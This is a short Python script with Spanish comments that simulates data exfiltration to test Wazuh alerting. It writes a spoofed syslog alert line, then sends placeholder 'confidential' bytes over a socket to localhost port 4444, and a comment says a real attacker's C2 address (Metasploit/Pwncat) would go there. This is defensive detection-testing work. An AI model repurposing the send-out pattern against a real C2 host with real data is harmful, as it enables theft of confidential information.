import socket
import syslog

def simulate_exfiltration():
    # En un entorno real, esto sería la IP de tu C2 (Server Metasploit/Pwncat)
    target_ip = "127.0.0.1" 
    target_port = 4444
    
    # Mensaje de ataque que Wazuh debe detectar (Match con local_rules.xml)
    log_message = f"X-FILTR attack detected on port {target_port}"
    
    print(f"[*] Simulando ataque hacia {target_ip}:{target_port}...")
    
    # TELEMETRÍA: Escribir en syslog para que el agente de Wazuh lo lea
    syslog.openlog(ident="wazuh-agent")
    syslog.syslog(syslog.LOG_NOTICE, log_message)
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        s.connect((target_ip, target_port))
        s.sendall(b"INFO_CONFIDENCIAL_EXFILTRADA")
        print(f"[+] Datos enviados al puerto {target_port}")
        s.close()
    except Exception as e:
        # La alerta de Wazuh se genera por el log de syslog, no por la conexión exitosa
        print(f"[!] Aviso: Conexión fallida ({e}), pero la telemetría ha sido enviada.")

if __name__ == "__main__":
    simulate_exfiltration()

